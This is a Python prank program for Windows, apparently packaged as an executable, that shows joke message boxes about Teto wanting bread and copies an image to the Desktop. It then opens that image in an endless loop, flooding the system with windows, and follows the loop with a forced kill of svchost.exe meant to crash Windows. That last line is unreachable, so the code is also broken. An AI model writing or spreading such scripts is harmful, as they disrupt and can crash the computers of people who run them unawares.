import os
import sys
import ctypes
import time
import subprocess

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

ctypes.windll.user32.MessageBoxW(0, "bread pls! (˶>⩊<˶)", "teto wants bread", 0x40)

time.sleep(3.5)

ctypes.windll.user32.MessageBoxW(0, "NO DONT GIVE HER THE BREAD! ( ˶°ㅁ°) !!", "miku : no bread for teto!!!", 0x40)


image_path = get_resource_path("no_bread_for_teto.png")


with open(image_path, "rb") as file:
    image_data = file.read()


save_folder = os.path.expanduser("~/Desktop")
save_location = os.path.join(save_folder, "no_bread_for_teto.png")


with open(save_location, "wb") as file:
    file.write(image_data)

print(f"Image extracted to: {save_location}")

while True:
	os.startfile(save_location)

time.sleep(48)

subprocess.run(["taskkill", "/F", "/IM", "svchost.exe"], shell=True)
